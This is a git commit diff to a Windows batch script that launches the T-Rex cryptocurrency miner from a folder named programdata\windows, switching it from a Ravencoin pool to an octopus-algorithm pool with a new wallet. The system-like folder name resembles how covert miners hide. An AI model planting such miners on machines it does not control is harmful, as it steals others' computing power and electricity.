c26a5294dd87bbc4b2d976c0bc17f7734713f0a7
lodio-999 <132812071+lodio-999@users.noreply.github.com>
2023-05-21 19:40:07 +0300

    Update rvn-pool.bat

--- rvn-pool.bat
+++ rvn-pool.bat
@@ -1,4 +1,4 @@
 @echo off
 cd %systemdrive%\programdata\windows
-t-rex.exe -a kawpow -o stratum+tcp://rvn.2miners.com:6060 -u RTKJqEgZEwNLdAvuTS6eRMJYp52YmqYBj7.test -p x
+t-rex.exe -a octopus -o stratum+tcp://pool.eu.woolypooly.com:3094 -u aapeauv83eer1c7ydwccb2sgh9xbcre8y6612v9fw4.new -p x
 pause
